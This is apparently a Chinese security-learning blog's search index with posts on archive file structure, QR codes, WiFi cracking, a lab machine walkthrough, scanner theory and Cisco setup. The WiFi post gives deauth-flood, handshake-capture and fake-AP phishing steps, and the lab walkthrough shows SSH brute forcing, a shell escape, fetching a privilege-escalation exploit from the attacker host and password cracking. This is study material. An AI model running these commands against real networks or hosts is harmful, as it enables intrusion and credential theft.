<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>压缩文件学习总结</title>
    <link href="/2020/02/13/%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2020/02/13/%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>最近换了一个hexo主题同时发现原来用的图床加载好像有些问题（不过点击放大还是能直接看到的），之后会使用新的图床。</p><h2 id="RAR文件的组成"><a href="#RAR文件的组成" class="headerlink" title="RAR文件的组成"></a>RAR文件的组成</h2><p>RAR是有四个文件块组成的，分别是分别是标记块、归档头部块、文件块、结束块，这些块之间没有固定地先后顺序，但要求第一个块必须是标志块并且其后紧跟一个归档头部块</p><p><img src="https://file.moetu.org/images/2020/02/13/rarbbd81624ae8af451.jpg" srcset="/img/loading.gif" alt=""></p><p>RAR的标记块和结束块都是固定的7字节序列，分别为0×52 61 72 21 1A 07 00和0xC4 3D 7B 00 40 07 00</p><p>每一块后面都有两个crc校验，在crc之后的字节用于判断块类型</p><pre><code>HEAD_TYPE=0x72 标记块HEAD_TYPE=0x73 压缩文件头HEAD_TYPE=0x74 文件头HEAD_TYPE=0x75 注释头HEAD_TYPE=0x76 旧风格的用户身份信息HEAD_TYPE=0x77 子块HEAD_TYPE=0x78 恢复纪录HEAD_TYPE=0x79 用户身份信息HEAD_TYPE=0x7a subblock</code></pre><p><img src="https://file.moetu.org/images/2020/02/13/rare37ad6ff47f4b200.png" srcset="/img/loading.gif" alt=""></p><p>比如上图rar要获取的文件除了flag.txt外还有secret.png，本来在A8 3C校验位后被改成了7A，被锁定后解压文件无法看到secret.png，所以这里需要自己改块标志将其改为文件块</p><h2 id="ZIP文件的组成"><a href="#ZIP文件的组成" class="headerlink" title="ZIP文件的组成"></a>ZIP文件的组成</h2><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p><p><img src="https://file.moetu.org/images/2020/02/13/zip158813ef018345b7.png" srcset="/img/loading.gif" alt=""></p><p>50 4B 03 04是ZIP头文件标记</p><p>14 03是解压文件需要的PK版本</p><p>00 00是全局方位标记（文件是否有加密可通过这两位来判断，单数为加密，偶数为无，例如：00 02 04表示加密，01 03 09表示无）</p><p>之后查看压缩包里有多少文件可以查找50 4B有多少个就行了</p><p>不过压缩源文件数据区跟压缩源文件目录区是不一样的，文件标识依然是前四位，之后四位分别对应压缩需要的PK版本跟解压需要的PK版本之后的00 00对应数据区的全局方位标记（判断加解密与上面一样）</p><p>在CTF题中会存在伪加密的zip文件，原理就是更改了其中的全局方位标记</p><p>ps：Kali中用binwalk -e可以直接解压，此工具分离文件的原理就是识别文件头后进行文件分离</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>qr码基础总结</title>
    <link href="/2020/02/13/qr%E7%A0%81%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/"/>
    <url>/2020/02/13/qr%E7%A0%81%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>二维码在日常生活经常用到可对于二维码如何加解密又知道多少呢？</p><h2 id="qrcode的基本结构"><a href="#qrcode的基本结构" class="headerlink" title="qrcode的基本结构"></a>qrcode的基本结构</h2><p><img src="http://tva1.sinaimg.cn/large/0080xEK2ly1gbuypkuuy8j30jr0bzwfl.jpg" srcset="/img/loading.gif" alt=""></p><pre><code>位置探测图形、位置探测图形分隔符、定位图形：定位qrcode的位置校正图形：笔者理解为校正图形的数量确定qrcode的规格格式信息：qrcode的纠错等级[L|M|Q|H]版本信息：qrcode的规格，最低为[21x21]，最高为[177x177]；ps：每个版本的递进模块+4数据和纠错码字：实际保存的二维码信息，和纠错码字（用于修正二维码损坏带来的错误）</code></pre><h2 id="编码过程"><a href="#编码过程" class="headerlink" title="编码过程"></a>编码过程</h2><p><strong>1. 数据分析：</strong>确定编码的字符类型，按相应的字符集转换成符号字符; 选择纠错等级</p><p><strong>2. 数据编码：</strong>将数据字符转换为位流，每8位一个码字，构成一个数据的码字序列</p><p>​                                                                        <strong>数据类型最大容量</strong></p><p><img src="https://file.moetu.org/images/2020/02/13/1422100-20181017155017768-59167363527fe3b3b18116920.png" srcset="/img/loading.gif" alt=""></p><p>​                                                                            <strong>对应指示符</strong></p><p><img src="https://file.moetu.org/images/2020/02/13/fu776cfc178c39fb8c.png" srcset="/img/loading.gif" alt=""></p><p>​                                                                    <strong>version对应数据长度</strong></p><p><img src="https://file.moetu.org/images/2020/02/13/huan68619b84b5d2e603.jpg" srcset="/img/loading.gif" alt=""></p><h3 id="码字序列是如何组成的？"><a href="#码字序列是如何组成的？" class="headerlink" title="码字序列是如何组成的？"></a>码字序列是如何组成的？</h3><p>例如：1234567</p><p>1.确认一段数据进行分组（数字三位一组，字符两位一组）</p><p>123 456 7</p><p>2.转换成二进制（根据version转换10|12|14位二进制数，剩下不满三位的转4|7位二进制数）</p><pre><code>123--&gt;0001111011456--&gt;01110010007--&gt;0111</code></pre><p>3.二进制排列成序列</p><pre><code>0001(数字指示标) 0000000111(数据长度7转化的二进制数) 0001111011 0111001000 0111 0000(结束符)</code></pre><p><strong>3.纠错编码</strong>：按需要将上面的码字序列分块，并根据纠错等级和分块的码字，产生纠错码字，并把纠错码字加入到数据码字序列后面，成为一个新的序列</p><p><img src="https://file.moetu.org/images/2020/02/13/cuo5d2251c441352806.png" srcset="/img/loading.gif" alt=""></p><p>在二维码规格和纠错等级确定的情况下，其实它所能容纳的码字总数和纠错码字数也就确定了，比如：版本10，纠错等级时H时，总共能容纳346个码字，其中224个纠错码字。就是说二维码区域中大约1/3的码字时冗余的。对于这224个纠错码字，它能够纠正112个替代错误（如黑白颠倒）或者224个据读错误（无法读到或者无法译码），这样纠错容量为：112/346=32.4%。</p><p><strong>4.构造最终数据信息</strong>：在规格确定的条件下，将上面产生的序列按次序放如分块中</p><p> 按规定把数据分块，然后对每一块进行计算，得出相应的纠错码字区块，把纠错码字区块 按顺序构成一个序列，添加到原先的数据码字序列后面。<br>如：D1, D12, D23, D35, D2, D13, D24, D36, … D11, D22, D33, D45, D34, D46, E1, E23,E45, E67, E2, E24, E46, E68，…</p><p><strong>5.构造矩阵</strong>：将探测图形、分隔符、定位图形、校正图形和码字模块放入矩阵中。</p><p><img src="https://file.moetu.org/images/2020/02/13/ju696eb1fc063fabe4.png" srcset="/img/loading.gif" alt=""></p><p><strong>6.掩摸</strong>：将掩摸图形用于符号的编码区域，使得二维码图形中的深色和浅色（黑色和白色）区域能够比率最优的分布。</p><p><strong>7.格式和版本信息</strong>：生成格式和版本信息放入相应区域内。</p><p>版本7-40都包含了版本信息，没有版本信息的全为0。二维码上两个位置包含了版本信息，它们是冗余的。<br>版本信息共18位，6X3的矩阵，其中6位时数据为，如版本号8，数据位的信息时 001000，后面的12位是纠错位。</p><h2 id="python的qrcode加解密"><a href="#python的qrcode加解密" class="headerlink" title="python的qrcode加解密"></a>python的qrcode加解密</h2><p><strong>1.qrcode加密</strong></p><pre><code>import qrcodeimport osimport sysimport time QRImagePath = os.getcwd() + &#39;/qrcode.png&#39;   #临时存储位置qr = qrcode.QRCode(             version=1,        error_correction=qrcode.constants.ERROR_CORRECT_L,        box_size=10,        border=2,)   #设置图片格式 data = input()  #运行时输入数据qr.add_data(data)qr.make(fit=True) img = qr.make_image()img.save(&#39;qrcode.png&#39;)  #生成图片if sys.platform.find(&#39;darwin&#39;) &gt;= 0:        os.system(&#39;open %s&#39; % QRImagePath)elif sys.platform.find(&#39;linux&#39;) &gt;= 0:        os.system(&#39;xdg-open %s&#39; % QRImagePath)else:        os.system(&#39;call %s&#39; % QRImagePath) time.sleep(5)   #间隔5个单位os.remove(QRImagePath)  #删除图片</code></pre><p><strong>2.qrcode解码</strong></p><pre><code>import osimport loggingfrom PIL import Imageimport zxing    #导入解析包import randomlogger = logging.getLogger(__name__)    #记录数据if not logger.handlers:    logging.basicConfig(level = logging.INFO)DEBUG = (logging.getLevelName(logger.getEffectiveLevel()) == &#39;DEBUG&#39;)   #记录调式过程# 在当前目录生成临时文件，规避java的路径问题def ocr_qrcode_zxing(filename):    img = Image.open(filename)    ran = int(random.random() * 100000)     #设置随机数据的大小    img.save(&#39;%s%s.jpg&#39; % (os.path.basename(filename).split(&#39;.&#39;)[0], ran))    zx = zxing.BarCodeReader()      #调用zxing二维码读取包    data = &#39;&#39;    zxdata = zx.decode(&#39;%s%s.jpg&#39; % (os.path.basename(filename).split(&#39;.&#39;)[0], ran))    #图片解码# 删除临时文件    os.remove(&#39;%s%s.jpg&#39; % (os.path.basename(filename).split(&#39;.&#39;)[0], ran))    if zxdata:        logger.debug(u&#39;zxing识别二维码:%s,内容: %s&#39; % (filename, zxdata))        data = zxdata    else:        logger.error(u&#39;识别zxing二维码出错:%s&#39; % (filename))        img.save(&#39;%s-zxing.jpg&#39; % filename)    return data     #返回记录的内容if __name__ == &#39;__main__&#39;:    filename = r&#39;G:\TestDemo\venv\二维码解析与生成\1536492016.png&#39;    # zxing二维码识别    ltext = ocr_qrcode_zxing(filename)  #将图片文件里的信息转码放到ltext里面    logger.info(u&#39;[%s]Zxing二维码识别:[%s]!!!&#39; % (filename, ltext))  #记录文本信息print(ltext)    #打印出二维码名字</code></pre>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WIFI破解</title>
    <link href="/2019/11/11/2019-11-11-WIFI%E7%A0%B4%E8%A7%A3/"/>
    <url>/2019/11/11/2019-11-11-WIFI%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>关于wifi破解的小技巧</p><h2 id="WPA四次握手"><a href="#WPA四次握手" class="headerlink" title="WPA四次握手"></a>WPA四次握手</h2><p>WPA 握手过程是基于802.1X 协议，使用eapol key进行封装传输,建立通信一共需要五个步骤.</p><p>AP初始化：<br>使用 SSID 和passphares作为入参，通过哈希算法产生PSK。在WPA-PSK 中PSK=PMK=pdkdf2_SHA1(passphrase, SSID, SSID length, 4096)</p><p>第一次握手：<br>AP广播SSID，AP_MAC(AA)；<br>STATION 端使用接收到的SSID，AP_MAC和passphares使用同样算法产生PSK。</p><p>第二次握手<br>STATION 发送一个随机数SNonce，STATION_MAC(SA)给AP；<br>AP端接收到SNonce、STATION_MAC(SA)后产生一个随机数ANonce，然后用 PMK、AP_MAC(AA)、STATION_MAC(SA)、SNonce、ANonce 用以下SHA1_PRF算法产生PTK，提取这个 PTK 前16 个字节组成一个MIC KEY。<br>PTK=SHA1_PRF(PMK, Len(PMK), “Pairwise key expansion”, MIN(AA, SA) || Max(AA, SA) || Min(ANonce, SNonce) || Max(ANonce, SNonce))</p> <a id="more"></a><p>第三次握手：<br>AP发送上面产生的ANonce给STATION<br>STATION 端用接收到ANonce 和以前产生PMK、SNonce、AP_MAC(AA)、STATION_MAC(SA)用同样的算法产生PTK。提取这个PTK 前16 个字节组成一个MIC KEY使用以下算法产生MIC值用这个MIC KEY 和一个802.1X数据帧使用以下算法得到MIC值<br>MIC = HMAC_MD5(MIC Key，16，802.1X data)</p><p>第四次握手：<br>STATION 发送802.1X 数据帧，MIC给AP；STATION 端用上面那个准备好的802.1X 数据帧在最后填充上MIC值和两个字节的0（十六进制）然后发送这个数据帧到AP。<br>AP端收到这个数据帧后提取这个MIC。并把这个数据帧的MIC部分都填上0（十六进制）这时用这个802.1X数据帧，和用上面AP产生的 MIC KEY 使用同样的算法得出MIC’。如果MIC’等于STATION 发送过来的MIC。那么第四次握手成功。若不等说明则AP 和 STATION 的密钥不相同，握手失败了。</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8ug10331qj30jd0fgjt2.jpg" srcset="/img/loading.gif" alt="img"></p><h3 id="破解原理"><a href="#破解原理" class="headerlink" title="破解原理"></a>破解原理</h3><p>用我们字典中的Passphrase+SSID先生成PMK，然后结合握手包中的STA_MAC、AP_MAC、ANONCE、SNONCE计算PTK，再加上原始的报文数据算出MIC并与AP发送的MIC比较，如果一致，那么该PSK就是密钥。</p><h2 id="Aircrack-ng破解"><a href="#Aircrack-ng破解" class="headerlink" title="Aircrack-ng破解"></a>Aircrack-ng破解</h2><h4 id="查找网卡"><a href="#查找网卡" class="headerlink" title="查找网卡"></a>查找网卡</h4><pre><code>iwconfig</code></pre><h4 id="关闭影响网卡监听的功能"><a href="#关闭影响网卡监听的功能" class="headerlink" title="关闭影响网卡监听的功能"></a>关闭影响网卡监听的功能</h4><pre><code>service network-manager stopairmon-ng check kill</code></pre><h4 id="开启网卡监听模式"><a href="#开启网卡监听模式" class="headerlink" title="开启网卡监听模式"></a>开启网卡监听模式</h4><pre><code>airmon-ng start wlan0</code></pre><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8uyrch1kkj30g00g576t.jpg" srcset="/img/loading.gif" alt="img"></p><p>这里网卡名已经变成wlan0mon了</p><h4 id="抓wifi数据包"><a href="#抓wifi数据包" class="headerlink" title="抓wifi数据包"></a>抓wifi数据包</h4><pre><code>airodump-ng wlan0mon</code></pre><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8uyuspz14j30g00g5tco.jpg" srcset="/img/loading.gif" alt="img"></p><h4 id="对目标wifi进行deauth"><a href="#对目标wifi进行deauth" class="headerlink" title="对目标wifi进行deauth"></a>对目标wifi进行deauth</h4><p>当洪水攻击执行后,目标wifi所有设备会停止连接,当有设备重新连接后会抓取设备的握手包</p><pre><code>airodump-ng wlan0mon --bssid 58:C8:76:2C:85:50 -c 5 -w wpa2-c代表频道, 后面带的是频道bssid: mac地址(物理地址)-w代表目录(抓到的握手包放在这个目录下面)</code></pre><p>如果之前探测包的第一个shell没有出现handshacke,可以进行断网攻击</p><pre><code>aireplay-ng -0 0 -a 58:C8:76:2C:85:50 wlan0mon</code></pre><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8uzgnqojoj30ix0g50z6.jpg" srcset="/img/loading.gif" alt="img"></p><p>这里已经有握手包了就断开攻击,毕竟人家一直连不上网也会怀疑出啥问题了</p><h4 id="字典爆破密码"><a href="#字典爆破密码" class="headerlink" title="字典爆破密码"></a>字典爆破密码</h4><pre><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2-01.cap</code></pre><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8uznelo0jj30g00g5n14.jpg" srcset="/img/loading.gif" alt="img"></p><p>成功后这里就会出现密码,我这里就不出成功后的状态了</p><h4 id="推荐一个工具fluxion"><a href="#推荐一个工具fluxion" class="headerlink" title="推荐一个工具fluxion"></a><strong>推荐一个工具fluxion</strong></h4><p>比airmon-ng要方便,上面命令要是不想记用这个方便</p><p><a href="https://github.com/deltaxflux/fluxion" target="_blank" rel="noopener">github下载地址</a></p><p>进入目录下执行./fluxion.sh </p><p>进入工具后选择语言,是有中文的,我这里进入的英文下的</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8uzwb6ei2j30ix0g5jwd.jpg" srcset="/img/loading.gif" alt="img"></p><p>选择1扫描所有信道.</p><p>这时会出现这个小白板,当里面有你想要攻击的wifi后ctrl-c停止扫描</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8uzybdlgjj30ix0g5wjc.jpg" srcset="/img/loading.gif" alt="img"></p><p>这里再选择你自己要攻击的</p><h4 id="建立虚假AP"><a href="#建立虚假AP" class="headerlink" title="建立虚假AP"></a>建立虚假AP</h4><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8v0089bsqj30ix0g5afw.jpg" srcset="/img/loading.gif" alt="img"></p><p>选择1,然后再按enter最后再选择aircrack-ng (Miss chance)进行抓包—–懒得截图</p><h4 id="洪水攻击"><a href="#洪水攻击" class="headerlink" title="洪水攻击"></a>洪水攻击</h4><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8v02u1te4j30ix0g5q7k.jpg" srcset="/img/loading.gif" alt="img"></p><p>选择1,之后会有两个窗口,当有设备连进来后选择抓取到的握手包,我这里不演示了</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8v05e1b2tj30ix0g50y0.jpg" srcset="/img/loading.gif" alt="img"></p><p>选择握手包后选择web interface,伪造一个假web登录界面(这里所有人都连不上wifi了),当有人输入wifi密码后fluxion脚本结束工作,密码现在你的电脑里了…</p>]]></content>
    
    
    <categories>
      
      <category>Kali学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶机渗透</title>
    <link href="/2019/11/10/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <url>/2019/11/10/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<p>好久没写过文章了,一次来一个实战的靶机渗透教程.</p><p>练习靶机的好处可以让你在接触实操的时候不会手忙脚乱不知道该先怎么用,光知道理论永远成为不了一个优秀的大牛.</p><h2 id="靶机下载地址"><a href="#靶机下载地址" class="headerlink" title="靶机下载地址"></a>靶机下载地址</h2><pre><code>https://pan.baidu.com/s/1wTPr1dr1hi1lzTFFu3u3Cg提取码:778f</code></pre><p>导入靶机后用pingman扫描靶机ip</p><pre><code>!/bin/bashif [ &quot;$1&quot; == &quot;&quot; ] thenecho &quot;Usage:./pingman.sh [betwork]&quot;echo &quot;Example:./pingman.sh 192.168.1&quot;elsefor ip in `seq 1 254`; do    ping -c 1 $1.$ip | grep &quot;64 bytes&quot; | cut -d &quot; &quot; -f 4 | sed &#39;s/.$//&#39; &amp; donefi</code></pre><p>此处ip</p><p>靶机:192.168.1.3</p><p>kali:192.168.1.5</p> <a id="more"></a><h2 id="第一步nmap扫"><a href="#第一步nmap扫" class="headerlink" title="第一步nmap扫"></a>第一步nmap扫</h2><p>nmap -A -sS -Pn -p- 192.168.1.3</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8t9adyydwj30kh0kmtdl.jpg" srcset="/img/loading.gif" alt="1"></p><p>这里可以看到靶机只有ssh和apache两个服务</p><p>进入192.168.1.3:8180可以看到一个nginx初始网页</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8t9cnzbkoj30z60nl75o.jpg" srcset="/img/loading.gif" alt="2"></p><p>没有什么可以看到的好东西</p><h2 id="dirb目录爆破"><a href="#dirb目录爆破" class="headerlink" title="dirb目录爆破"></a>dirb目录爆破</h2><p>由于用dirb <a href="http://192.168.1.3:8180/也爆不出什么可用网页于是用工具自带的大字典进行爆破" target="_blank" rel="noopener">http://192.168.1.3:8180/也爆不出什么可用网页于是用工具自带的大字典进行爆破</a></p><p>locate dirb—–查看有关dirb的目录位置</p><p>big.txt可以用这个找到</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8t9lqdmegj312p0mqjws.jpg" srcset="/img/loading.gif" alt="img"></p><p>这里可以看到apache指定网页的存放路径</p><p>我们将自己的hosts文件中的加上域名</p><pre><code>192.168.1.3 mario.supermariohost.local</code></pre><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8taa8nzfoj30vw0nlwfk.jpg" srcset="/img/loading.gif" alt="img"></p><p>这里是一个没有马里奥的游戏</p><p>由于个人原因,这里靶机ip为192.168.36.195</p><p>因为上面的东西也没有什么特别有价值的所以我们用御剑再爆一次</p><h2 id="dirbuster"><a href="#dirbuster" class="headerlink" title="dirbuster"></a>dirbuster</h2><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8u43hb8xsj30lf0gg3zh.jpg" srcset="/img/loading.gif" alt="img"></p><p>这里发现了两个新的网页</p><p>command是一个查询用户名的界面,这个界面可以想想之前的ssh服务说不定是这个用户名登录的</p><p>luigi里面是一封信</p><p>…截图太麻烦所以这里两个页面留给大家自己实践去查看</p><p>这里不知道为什么在command.php中怎么也爆不出用户名(可能是作者故意设置的一个坑)</p><h2 id="字典生成"><a href="#字典生成" class="headerlink" title="字典生成"></a>字典生成</h2><pre><code>cewl mario.supermariohost.local:8180/luigi.php -w /root/user.txt</code></pre><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8u4gz3mfoj30hk0g5acq.jpg" srcset="/img/loading.gif" alt="img"></p><pre><code>john --wordlist=user.txt --stdout --rules &gt;pass.txt</code></pre><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8u4jaqtvjj30hk0g541b.jpg" srcset="/img/loading.gif" alt="img"></p><p>有了字典之后我们就能进行ssh爆破了</p><h2 id="hydra-ssh爆破"><a href="#hydra-ssh爆破" class="headerlink" title="hydra ssh爆破"></a>hydra ssh爆破</h2><pre><code>hydra -L user.txt -P pass.txt 192.168.36.195 ssh -t 4 -V</code></pre><p>这个过程有点长…..</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8u52cht2ej30jb0fi44p.jpg" srcset="/img/loading.gif" alt="img"></p><p>有了帐号密码当然ssh连接看看呀</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8u59zt7lsj30jb0fiq4x.jpg" srcset="/img/loading.gif" alt="img"></p><p>这里发现有些命令执行不了,管理员做了限制.在终端输入?查看可以使用的命令有awk.好嘞,你等着!!!</p><h2 id="awk权限绕过"><a href="#awk权限绕过" class="headerlink" title="awk权限绕过"></a>awk权限绕过</h2><pre><code>awk &#39;BEGIN{system(&quot;/bin/bash&quot;)}&#39;</code></pre><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8u5e5x3jsj30jb0fi0y1.jpg" srcset="/img/loading.gif" alt="img"></p><p>成功绕过后我们查看内核版本信息,发现是3.13.0的老系统,回到kali找exp进行提权</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8u5kqzbopj30pz0sd7hj.jpg" srcset="/img/loading.gif" alt="img"></p><p>靶机下载做好的提权脚本</p><pre><code>wget 192.168.36.208/exp3.13</code></pre><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8u5oo8mijj30jb0kmmzt.jpg" srcset="/img/loading.gif" alt="img"></p><p>有了root权限后使用python切换shell</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>在/root下找到flag.zip,发现有密码,继续放到kali进行解密</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8u5uyym9ij30xm0e8449.jpg" srcset="/img/loading.gif" alt="img"></p><h2 id="zip解密"><a href="#zip解密" class="headerlink" title="zip解密"></a>zip解密</h2><pre><code>fcrackzip -D -p rockyou.txt -u /root/flag.zip</code></pre><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8u63djzivj30g00cywg0.jpg" srcset="/img/loading.gif" alt="img"></p><p>查看flag</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8u64q99f4j30g00ev40o.jpg" srcset="/img/loading.gif" alt="img"></p><p>这里作者最后让我们把所以的密码都明文解密出来</p><p>把/etc/shadow下的root mario luigi   copy出来放到kali进行john解密</p><pre><code>john --wordlist=rockyou.txt userpass.txt</code></pre><p>好了所有的内容都做完了,整理总结,最后密码懒得发图,交给大家自己实践了,哈哈哈</p>]]></content>
    
    
    <categories>
      
      <category>Kali学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>靶机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>扫描器原理讲解</title>
    <link href="/2019/09/23/%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/"/>
    <url>/2019/09/23/%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>好久没更新了，拖更这么久现在弄个纯理论的应付一下</p><h2 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h2><ul><li><p>connect：直接通过connect接口扫描tcp三次握手协议，且扫描速度极快。</p></li><li><p>SYN：向目标发送一个syn包，若返回syn|ack包则端口开放，若返回rst未开放，比起connect属于半连接，因为并没有建立完整的三次握手协议，所以更加隐蔽。</p></li><li><p>FIN：向目标发送fin包，成功包将被忽略，失败返回rst。这种方式仅用于unix和一些存在tcp bug的操作系统，不过比起syn还要隐蔽。</p></li><li><p>Xmas Tree：发送FIN、URG、PUSH包，若关闭返回rst。</p></li><li><p>reverse ident：ident协议允许通过tcp连接得到进程所有者的用户名，ftp所有者的信息，及其他需要的信息。</p></li><li><p>ACK：根据ack位的设置情况探测防火墙的安全性。</p></li><li><p>RPC：unix特有的，检测定位远程过程调用rpc端口及相关程序与版本标号。</p> <a id="more"></a><h2 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h2></li><li><p>icmp：因为udp本身是无连接，所以不会返回任何响应包，不过端口关闭会返回icmp_port_unreach。这种扫描方式很不可靠，而且比较慢。</p></li><li><p>icmp扫射：通过速度慢，主要利用ping快速确认网段中有多少活跃主机。</p></li><li><p>分片扫描：在发送扫描包时，将数据包分成许多ip分片，通过tcp包头分为几段，放入不同ip包中。这种方法能绕过一些包过滤程序，不过某些程序无法正确处理分割包，从而导致崩溃。</p></li></ul><h3 id="ARP定义及原理"><a href="#ARP定义及原理" class="headerlink" title="ARP定义及原理"></a>ARP定义及原理</h3><p>arp（地址解析协议）工作在数据链路层，与硬件接口联系对上层提供服务。ip数据包通过以太网发送，而以太网设备不识别32位ip地址它们时以48位进行传输的，所以必须把ip目的地址转换成以太网地址。<br>每台主机都会在自己的arp缓冲区中建立arp表，通过此表可表示ip地址对应的mac地址。发送数据包是会查找自己的ARP表，没有则发送ARP广播包，查询目标的mac地址。<br>ARP欺骗则是发送一个自己伪造的arp应答，当其他主机接收到将包放在自己的ARP表中就会造成网络出现掉线等问题。<br>通过arp查mac地址说明有主机存活，通过ping可检测有无防火墙，snmp可判断是否有网络设备，如果是还可以得到设备名。</p><h3 id="操作系统识别技术"><a href="#操作系统识别技术" class="headerlink" title="操作系统识别技术"></a>操作系统识别技术</h3><h4 id="1-icmp查看TTL值，不同的操作系统是不一样的。"><a href="#1-icmp查看TTL值，不同的操作系统是不一样的。" class="headerlink" title="1.icmp查看TTL值，不同的操作系统是不一样的。"></a>1.icmp查看TTL值，不同的操作系统是不一样的。</h4><ul><li>Windows NT TTL=107</li><li>Windows 2000 TTL=108</li><li>Windows 9x TTL=127或128</li><li>Linux TTL=240或241</li><li>Solaris TTL=252</li><li>Lrix TTL=240</li></ul><h4 id="2-获取应用程序标识"><a href="#2-获取应用程序标识" class="headerlink" title="2.获取应用程序标识"></a>2.获取应用程序标识</h4><p>对主机进行Telnet或ftp可返回banner信息。</p><h4 id="3-操作系统指纹"><a href="#3-操作系统指纹" class="headerlink" title="3.操作系统指纹"></a>3.操作系统指纹</h4><pre><code class="utf-8">1.TTL2.df位3.Window size4.ack序号5.icmp地址屏蔽请求6.FIN包的响应7.虚假标识的SYN包8.ISN9.icmp错误信息10.icmp消息引用11.tos服务类型12.分段重组处理13.mss（最大分段尺寸）14.SYN FLOOD限度15.主机使用的端口16.Telnet选项指纹17.http指纹18.打印机服务指纹</code></pre>]]></content>
    
    
    <categories>
      
      <category>Kali学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCO网络设备基本配置</title>
    <link href="/2019/06/22/CISCO%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
    <url>/2019/06/22/CISCO%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><h4 id="1-交换机的工作模式"><a href="#1-交换机的工作模式" class="headerlink" title="1.交换机的工作模式"></a>1.交换机的工作模式</h4><pre><code>Switch&gt;enable（用户模式）Switch#configure  terminal（特权模式）Switch(config)#interface fastEthernet 0/1（全局配置模式）Switch(config-if)#ip address 192.168.1.1 255.255.255.0（接口模式）no shutdown（开启接口）exit返回上一模式end直接退到特权模式</code></pre><a id="more"></a><h4 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2.常用命令"></a>2.常用命令</h4><p>特权模式下</p><pre><code>show running-config（查看配置信息）show version（查看IOS版本信息）show mac-address-table（查看MAC地址表）show interface fastethernet 0/1（查看接口信息双工和速率）write（保存交换机配置）reload（恢复设备出厂默认值）</code></pre><p>全局模式下</p><pre><code>hostname default（修改主机名）enable password 123456（配置enable明文口令）enable secret 123456（配置enable加密口令）no ip domain-lookup（禁用DNS查询）</code></pre><p>接口模式下</p><pre><code>ip address ip地址 子网掩码（配置静态ip）duplex [full|half|auto]（全双工、半双工、自动）speed[10|100|1000|auto]（通信速率）</code></pre><h4 id="vlan的配置"><a href="#vlan的配置" class="headerlink" title="vlan的配置"></a>vlan的配置</h4><pre><code>vlan 10（创建vlan）name aaa（进入vlan后给vlan命名）interface vlan 10（进入vlan10）ip address 192.168.1.10 255.255.255.0no shutdownno vlan 10（删除vlan）interface range f0/1 – 10switchport access vlan  10（将1-10接口划入vlan10）</code></pre><h4 id="默认网关配置"><a href="#默认网关配置" class="headerlink" title="默认网关配置"></a>默认网关配置</h4><pre><code>ip default-gateway 192.168.1.1</code></pre><h4 